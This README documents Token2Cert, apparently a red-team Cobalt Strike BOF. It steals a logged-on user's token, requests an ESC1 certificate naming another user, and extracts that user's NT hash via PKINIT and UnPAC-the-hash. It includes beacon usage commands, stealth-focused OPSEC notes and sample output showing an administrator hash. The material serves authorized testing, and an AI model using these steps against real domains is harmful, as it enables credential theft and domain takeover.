# Token2Cert

**ESC1 Certificate Abuse via Token Impersonation**

Beacon Object File (BOF) for Cobalt Strike that abuses ESC1 vulnerable certificate templates through token impersonation to extract NT hashes of arbitrary domain users.

---

## Features

| Feature | Description |
|---------|-------------|
| **Token Stealing** | Steal token from user with enrollment rights (no process injection) |
| **Session Enumeration** | List all active sessions on the target |
| **ESC1 Exploitation** | Request cert with arbitrary SAN via vulnerable template |
| **KB5014754 Bypass** | Includes SID in SAN for Strong Certificate Mapping |
| **PKINIT Authentication** | Full RFC 4556 implementation |
| **UnPAC-the-hash** | Extract NT hash from PAC credentials |
| **All in memory** | No PowerShell, no files on disk |

---

## OPSEC Profile

| Aspect | Value |
|--------|-------|
| PowerShell | No |
| Files on disk | No |
| Process Injection | No |
| New visible process | No |
| Everything in memory | Yes |
| Event logs | 4624 (logon), 4768 (TGT) |

---

## Build

```bash
# On Kali/Linux
git clone <repo> && cd Token2Cert
chmod +x build.sh && ./build.sh

# Or with make
make
```

**Requirements:** `mingw-w64` (`sudo apt install mingw-w64`)

---

## Usage

### Cobalt Strike

1. Script Manager → Load → `cobaltstrike/token2cert.cna`

### Commands

```bash
# List active sessions
beacon> token2cert sessions

# ESC1 attack
beacon> token2cert run <session> <CA> <template> <target_upn>
```

### Arguments

| Argument | Description |
|----------|-------------|
| `session` | Session ID or username with ESC1 enrollment rights |
| `CA` | Certificate Authority (e.g., `CA01\\Corp-CA`) |
| `template` | Vulnerable ESC1 template name |
| `target_upn` | Target user's UPN (e.g., `administrator@corp.local`) |

### Example

```bash
# Step 1: Enumerate sessions to find user with enrollment rights
beacon> token2cert sessions

[*] Active Sessions:
    Session    Username                  State
    -------    --------                  -----
    1          CORP\Administrator        Active
    2          CORP\helpdesk             Active

# Step 2: Use helpdesk's token (has ESC1 enrollment rights) to get Administrator's hash
beacon> token2cert run 2 "CA01\\Corp-CA" ESC1 administrator@corp.local

[*] Token2Cert - Token Stealing Attack
[+] Token stolen from explorer.exe (PID: 5678, Session: 2)
[+] Token owner: CORP\helpdesk
[+] Impersonation successful
[*] Template: ESC1
[*] Target: administrator@corp.local
[+] Certificate enrolled successfully
[+] PFX (base64, password: Token2Cert):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUD...

[*] Performing PKINIT authentication...
[+] TGT obtained!
[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqq...

[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4
```

---

## How It Works

```
1. Enumerate sessions → find user with ESC1 enrollment rights
2. Steal token from that user's session (explorer.exe)
3. Impersonate user
4. Request certificate with arbitrary SAN
   → Uses vulnerable ESC1 template
   → Includes SID in SAN for KB5014754 bypass
5. Revert to original context
6. PKINIT authentication as target user
7. Extract target's NT hash via UnPAC-the-hash
```

### Attack Flow Diagram

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Steal Token    │────▶│  Request Cert    │────▶│     PKINIT      │
│  (helpdesk)     │     │  (SAN=admin)     │     │  (as admin)     │
└─────────────────┘     └──────────────────┘     └────────┬────────┘
                                                          │
                                                          ▼
                                                 ┌─────────────────┐
                                                 │  NT Hash        │
                                                 │  (admin)        │
                                                 └─────────────────┘
```

---

## Requirements

- Elevated privileges (Admin/SYSTEM)
- User with ESC1 enrollment rights must have active session
- Network access to Certificate Authority and KDC
- Vulnerable ESC1 template in the environment
- x64 beacon only

---

## Files

```
Token2Cert/
├── README.md
├── Makefile
├── build.sh
├── cobaltstrike/
│   ├── token2cert.cna
│   └── bofs/
│       └── Token2Cert.x64.o
├── include/
│   ├── beacon.h
│   └── bofdefs.h
└── src/
    └── Token2Cert.c
```

---

## Integration Status

| Component | Status |
|-----------|--------|
| Session Enumeration | ✅ Complete |
| Token Stealing | ✅ Complete |
| Certificate Request (ESC1) | ✅ Complete |
| PKINIT | ✅ Complete |
| UnPAC-the-hash | ✅ Complete |
| KB5014754 Bypass | ✅ Complete |

---

## References

- [ESC1-unPAC BOF](https://github.com/RayRRT/BOFs) - PKINIT + UnPAC implementation
- [RFC 4556 - PKINIT](https://tools.ietf.org/html/rfc4556)
- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

---

## Disclaimer

This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
